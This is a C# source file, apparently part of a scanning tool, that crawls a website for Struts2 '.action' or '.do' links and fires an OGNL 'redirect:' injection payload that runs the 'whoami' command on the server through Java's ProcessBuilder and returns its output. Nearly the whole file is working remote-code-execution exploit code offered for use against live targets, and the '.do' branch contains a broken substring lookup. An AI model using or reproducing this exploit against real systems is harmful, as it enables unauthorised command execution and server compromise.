using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
namespace windowsmanger
{
	internal class Struts2
	{
		public string exp(string urls)
		{
			string result;
			try
			{
				string url = urls;
				if (!url.Contains("http://"))
				{
					url = "http://" + url + "/";
				}
				string cmdtext = "whoami";
				string exp = "?redirect:${%23a%3d(new java.lang.ProcessBuilder(\"";
				string exp2 = "\")).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}";
				string sss = new WebClient
				{
					Encoding = Encoding.Default
				}.DownloadString(url + exp + cmdtext + exp2);
				if (sss.Contains("html"))
				{
					result = "未做安全检测";
				}
				else
				{
					result = sss;
				}
			}
			catch
			{
				result = "未做安全检测";
			}
			return result;
		}
		public string struts2exp(string urls)
		{
			string url = urls;
			if (!url.Contains("http://"))
			{
				url = "http://" + url + "/";
			}
			string getconment = this.GetWebContent(url);
			string jieguo = this.DumpHrefs(getconment, url);
			if (jieguo == "未做安全检测")
			{
				return "未做安全检测";
			}
			return jieguo;
		}
		public string DumpHrefs(string inputString, string url)
		{
			string result;
			try
			{
				Regex r = new Regex("href\\s*=\\s*(?:\"(?<1>[^\"]*)\"|(?<1>\\S+))", RegexOptions.IgnoreCase | RegexOptions.Compiled);
				Match i = r.Match(inputString);
				while (i.Success)
				{
					string bbv = i.Groups[1].ToString().Replace("'", "").Replace("#", "");
					if (!bbv.Contains("http://"))
					{
						bbv = url + bbv;
					}
					if (bbv.Contains(".action"))
					{
						string bbs = bbv.Substring(0, bbv.IndexOf(".action") + 7);
						string shujujieguo = this.exp(bbs);
						result = shujujieguo.Replace(" ", "");
						return result;
					}
					if (bbv.Contains(".do"))
					{
						string bbs2 = bbv.Substring(0, bbv.IndexOf(".action") + 7);
						string shujujieguo2 = this.exp(bbs2);
						result = shujujieguo2;
						return result;
					}
					i = i.NextMatch();
				}
				result = "未做安全检测";
			}
			catch
			{
				result = "未做安全检测";
			}
			return result;
		}
		private string GetWebContent(string Url)
		{
			string strResult = "";
			try
			{
				HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Url);
				request.Timeout = 30000;
				request.Headers.Set("Pragma", "no-cache");
				HttpWebResponse response = (HttpWebResponse)request.GetResponse();
				Stream streamReceive = response.GetResponseStream();
				Encoding encoding = Encoding.GetEncoding("GB2312");
				StreamReader streamReader = new StreamReader(streamReceive, encoding);
				strResult = streamReader.ReadToEnd();
			}
			catch
			{
				strResult = "";
			}
			return strResult;
		}
	}
}
